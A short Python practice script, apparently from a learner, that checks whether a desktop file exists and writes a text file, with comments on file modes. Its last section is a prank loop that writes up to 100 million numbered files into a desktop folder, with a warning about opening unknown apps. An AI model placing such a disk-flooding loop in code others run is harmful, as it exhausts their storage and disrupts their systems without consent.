import os
############################# detect files
file_path = "/home/danbar/Desktop/Text File (1).txt" #Windows sucks "C:/Users/danbar/Desktop/Text File (1).txt"

if os.path.exists(file_path):
    print(f"The location '{file_path}' exists")

    if os.path.isfile(file_path): # os.path.isdir to check is that a directory
        print("That is a file")
else:
    print("doesnt exist ")
############################# detect files
############################# writing files
txt_data = "I hate pizza"
file_path_output = "rand_labeled_output.txt"
try:
    with open(file_path_output, "w") as file: # "w" write file if that exist | "x" if file doesnt exist, that will create it another way = error 
        file.write(txt_data)                  # "a" to append file | "r" to read
        print(f"txt file '{file_path_output}' was created")
except FileExistsError:
    print("File already exists!")
############################# writing files
for x in range (100000000):
    bye_bye_desktop_data = "Be sure to not open unknown apps on your pc!"
    bye_bye_desktop_path = "/home/danbar/Desktop/test_folder/thats_a_prank_bro" + f"{x}"
    with open(bye_bye_desktop_path, "w") as file:
        file.write(bye_bye_desktop_data)
        print(f"txt file Nr {x} has been created")

############################# writing files





